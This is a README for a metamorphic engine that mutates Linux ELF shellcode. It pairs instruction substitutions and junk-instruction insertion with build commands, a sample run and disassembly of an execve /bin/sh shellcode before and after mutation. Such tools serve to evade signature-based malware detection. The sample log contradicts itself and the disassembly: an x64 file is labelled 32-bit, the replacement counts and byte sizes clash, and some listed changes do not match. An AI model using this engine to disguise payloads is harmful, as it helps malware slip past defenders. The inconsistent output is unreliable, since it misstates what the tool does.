# Metamorph

This code is a simple metamorphic engine that takes a 32-bit/64-bit ELF executable binary as input, and generates a 32-bit/64-bit metamorphicated ELF executable binary file. It currently supports injecting these instructions as NOP:
- NOP
- CMP [register],[register]
- PUSH [register] / POP [register]
- PUSHAD / POPAD

And altering these instructions:

- mov [register 1], [register 2]

<table>
        <tr>
            <td align=center>Original</td>
            <td></td>
            <td align=center>Metamorphicated (sample 1)</td>
            <td align=center>Metamorphicated (sample 2)</td>
        </tr>
        <tr>
            <td>

```diff
- MOV ECX, ESP
```

</td>
<td align=center>→</td>
<td>
        
```diff
+ push ESP
+ pop ECX
```

</td>
<td>
        
```diff
+ XOR ECX, ECX 
+ ADD ECX, ESP
```

</td>
        </tr>
    </table>

- xor [register], [register]

<table>
        <tr>
            <td align=center>Original</td>
            <td></td>
            <td align=center>Metamorphicated (sample 1)</td>
            <td align=center>Metamorphicated (sample 2)</td>
        </tr>
        <tr>
            <td>

```diff
- XOR EAX, EAX
```

</td>
<td align=center>→</td>
<td>

```diff
+ MOV EAX, 0
```

</td>
<td>

```diff
+ SUB EAX, EAX
```

</td>
        </tr>
    </table>

- mov [register], [immidiate value]

<table>
        <tr>
            <td align=center>Original</td>
            <td></td>
            <td align=center>Metamorphicated (sample 1)</td>
            <td align=center>Metamorphicated (sample 2)</td>
            <td align=center>Metamorphicated (sample 3)</td>
        </tr>
        <tr>
            <td>

```diff
- MOV AL, 0xB
```

</td>
<td align=center>→</td>
<td>

```diff
+ MOV CL, 0x5A
+ MOV AL, 0xB1
+ ADD AL, CL
```

</td>
<td>

```diff
+ MOV CL, 0x22
+ MOV AL, 0x29
+ XOR AL, CL
```

</td>
<td>

```diff
+ MOV CL, 0x64
+ MOV AL, 0x6F
+ SUB AL, CL
```

</td>
        </tr>
    </table>

* Note: In some runs, the newly created shellcode might crash. Run the tool again, and it may work correctly.

## Usage

Simply convert your assembly code into a machine code using these commands.

For 32-bit:
```
nasm -f elf32 shellcode.asm -o shellcode.o
ld -m elf_i386 -s -o shellcode shellcode.o
```

For 64-bit:
```
nasm -f elf64 shellcode.asm -o shellcode.o
ld shellcode.o -o shellcode
```

After that, you can use this tool to generate a metamorphicated 32-bit/64-bit ELF file:
```
./Metamorph shellcode new_executable
```

## Example:
```
┌──(kali㉿kali)-[~/Codes/Go/Metamorph]
└─$ ./Metamorph x64shellcode x64shellcode2
Original file: 4492 bytes (32-bit)
Disassembled 11 instructions
Replaced 1 MOV reg, imm pattern:
  0x15: MOV AL, 0xB -> MOV CL, 0xD; MOV AL, 0xFE; ADD AL, CL
Replaced 1 XOR/MOV pattern:
  0x11: MOV ECX, ESP -> PUSH ESP; POP ECX
  0xd: MOV EBX, ESP -> PUSH ESP; POP EBX
  0x0: XOR EAX, EAX -> SUB EAX, EAX
Applied 2 transformation(s)
Injecting NOP at offset 0x15

.text size change: 25 -> 30 bytes (+5)

Output file: 4497 bytes

Success: shellcode2

┌──(kali㉿kali)-[~/Codes/Go/Metamorph]
└─$ ./x64shellcode2
$ whoami
kali
```

## Disassembly Difference
For original ELF:
```
┌──(kali㉿kali)-[~/Codes/Go/Metamorph]
└─$ objdump -d -M intel x64shellcode

x64shellcode:     file format elf64-x86-64


Disassembly of section .text:

0000000000401000 <_start>:
  401000:       48 31 ff                xor    rdi,rdi
  401003:       57                      push   rdi
  401004:       48 bf 2f 62 69 6e 2f    movabs rdi,0x68732f6e69622f
  40100b:       73 68 00
  40100e:       57                      push   rdi
  40100f:       48 89 e7                mov    rdi,rsp
  401012:       48 31 f6                xor    rsi,rsi
  401015:       56                      push   rsi
  401016:       57                      push   rdi
  401017:       48 89 e6                mov    rsi,rsp
  40101a:       48 31 d2                xor    rdx,rdx
  40101d:       b8 3b 00 00 00          mov    eax,0x3b
  401022:       0f 05                   syscall
```


For metamorphicated ELF:
```
┌──(kali㉿kali)-[~/Codes/Go/Metamorph]
└─$ objdump -d -M intel x64shellcode2

x64shellcode2:     file format elf64-x86-64


Disassembly of section .text:

0000000000401000 <_start>:
  401000:       48 29 ff                sub    rdi,rdi
  401003:       57                      push   rdi
  401004:       48 bf 2f 62 69 6e 2f    movabs rdi,0x68732f6e69622f
  40100b:       73 68 00
  40100e:       57                      push   rdi
  40100f:       48 89 e7                mov    rdi,rsp
  401012:       48 39 d2                cmp    rdx,rdx
  401015:       48 c7 c6 00 00 00 00    mov    rsi,0x0
  40101c:       56                      push   rsi
  40101d:       57                      push   rdi
  40101e:       48 89 e6                mov    rsi,rsp
  401021:       48 c7 c2 00 00 00 00    mov    rdx,0x0
  401028:       b8 3b 00 00 00          mov    eax,0x3b
  40102d:       0f 05                   syscall
```
